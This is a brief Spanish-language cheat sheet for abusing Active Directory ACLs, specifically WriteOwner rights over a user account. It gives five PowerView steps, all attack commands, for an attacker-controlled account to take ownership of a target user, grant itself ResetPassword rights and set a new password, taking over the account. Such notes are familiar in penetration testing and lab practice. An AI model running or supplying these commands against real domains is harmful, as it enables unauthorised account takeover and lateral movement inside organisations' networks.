# Abuso ACL 

Tags: #AD #ACL #Windows

## WriteOwner sobre Usuario 

```bash 
Paso 1:
# Cargar PowerView a la máquina víctima 
❯ Import-Module .\PowerView.ps1
```

```bash 
Paso 2:
# Cambiar el propietario del objeto
❯ Set-DomainObjectOwner -Identity "TargetUser" -OwnerIdentity "ControlledAccount"

	# TargetUser = Usuario víctima (Objetivo)
	# ControlledAccount = Usuario atacante (Controlas)

Paso 3:
# Dar permiso para resetear la contraseña
❯ Add-DomainObjectAcl -TargetIdentity "TargetUser" -PrincipalIdentity "ControlledAccount" -Rights ResetPassword

Paso 4:
# Crear una SecureString con la nueva contraseña
❯ $cred = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force

Paso 5:
# Cambiar la contraseña del usuario víctima 
❯ Set-DomainUserPassword -Identity "TargetUser" -AccountPassword $cred
```